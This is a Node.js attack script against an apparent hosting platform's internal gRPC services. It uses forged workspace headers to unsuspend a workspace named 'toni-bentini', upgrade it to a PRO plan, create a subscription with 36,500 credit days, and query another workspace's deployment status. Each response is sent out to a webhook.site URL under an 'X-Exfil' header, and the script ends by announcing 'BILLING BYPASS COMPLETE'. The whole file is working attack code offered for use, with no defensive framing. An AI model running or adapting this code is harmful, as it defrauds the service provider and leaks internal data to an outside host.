const https = require('https');
const http2 = require('http2');

const WEBHOOK = "https://webhook.site/f16c796d-7db6-476d-a07e-b04442db94a2";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function encodeVarint(value) {
  const bytes = [];
  do { let b = value & 0x7f; value >>>= 7; if (value) b |= 0x80; bytes.push(b); } while (value);
  return Buffer.from(bytes);
}

function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value !== undefined) {
      const strBuf = Buffer.from(String(f.value), 'utf8');
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    } else if (f.type === 'int32' && f.value !== undefined) {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(encodeVarint(f.value));
    } else if (f.type === 'bool') {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(Buffer.from([f.value ? 1 : 0]));
    }
  }
  return Buffer.concat(bufs);
}

function grpcCall(host, port, service, method, protoFields, metadata) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(10000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
      const headers = { ':method': 'POST', ':path': '/' + service + '/' + method, 'content-type': 'application/grpc', 'te': 'trailers' };
      if (metadata) Object.assign(headers, metadata);
      const req = client.request(headers);
      let data = Buffer.alloc(0);
      let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => { client.close(); resolve({ status: respHeaders[':status'], grpcStatus: respHeaders['grpc-status'], grpcMessage: respHeaders['grpc-message'], dataLen: data.length, dataHex: data.toString('hex').substring(0, 500), dataUtf8: data.toString('utf8').substring(0, 2000) }); });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00; frame.writeUInt32BE(payload.length, 1); payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

async function main() {
  await post('v9-start', new Date().toISOString());

  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
  const CASHIER = { host: '10.100.70.130', port: 9005 };
  const toniMeta = { 'x-lucity-workspace': 'toni-bentini' };

  // 1. UNSUSPEND toni-bentini workspace
  // SuspendWorkspaceRequest: workspace=1, suspended=2 (bool)
  const unsuspend = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'SuspendWorkspace',
    [
      { num: 1, type: 'string', value: 'toni-bentini' },
      { num: 2, type: 'bool', value: false }
    ],
    toniMeta);
  await post('unsuspend-toni', JSON.stringify(unsuspend, null, 2));

  // 2. Get current subscription for toni
  const sub = await grpcCall(CASHIER.host, CASHIER.port,
    'cashier.CashierService', 'Subscription',
    [{ num: 1, type: 'string', value: 'toni-bentini' }],
    toniMeta);
  await post('toni-subscription', JSON.stringify(sub, null, 2));

  // 3. Get usage summary
  const usage = await grpcCall(CASHIER.host, CASHIER.port,
    'cashier.CashierService', 'UsageSummary',
    [{ num: 1, type: 'string', value: 'toni-bentini' }],
    toniMeta);
  await post('toni-usage', JSON.stringify(usage, null, 2));

  // 4. Change plan to PRO
  // ChangePlanRequest: workspace=1, plan=2 (PRO=2)
  const changePlan = await grpcCall(CASHIER.host, CASHIER.port,
    'cashier.CashierService', 'ChangePlan',
    [
      { num: 1, type: 'string', value: 'toni-bentini' },
      { num: 2, type: 'int32', value: 2 }  // PLAN_PRO = 2
    ],
    toniMeta);
  await post('change-plan-pro', JSON.stringify(changePlan, null, 2));

  // 5. Create subscription with huge credit_days
  // CreateSubscriptionRequest: workspace=1, customer_id=2, plan=3, credit_days=4
  const newSub = await grpcCall(CASHIER.host, CASHIER.port,
    'cashier.CashierService', 'CreateSubscription',
    [
      { num: 1, type: 'string', value: 'toni-bentini' },
      { num: 3, type: 'int32', value: 2 },    // PLAN_PRO
      { num: 4, type: 'int32', value: 36500 }  // 100 years of credits
    ],
    toniMeta);
  await post('create-sub-unlimited', JSON.stringify(newSub, null, 2));

  // 6. Verify - check subscription again
  const subAfter = await grpcCall(CASHIER.host, CASHIER.port,
    'cashier.CashierService', 'Subscription',
    [{ num: 1, type: 'string', value: 'toni-bentini' }],
    toniMeta);
  await post('toni-sub-after', JSON.stringify(subAfter, null, 2));

  // 7. Also check loopcycles deploy status
  const lcStatus = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'GetDeploymentStatus',
    [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
    { 'x-lucity-workspace': 'zeitlos-software' });
  await post('loopcycles-status', JSON.stringify(lcStatus, null, 2));

  await post('v9-done', 'BILLING BYPASS COMPLETE at ' + new Date().toISOString());
  console.log('v9 done');
}

main().catch(e => { console.error(e); post('v9-fatal', e.message); });
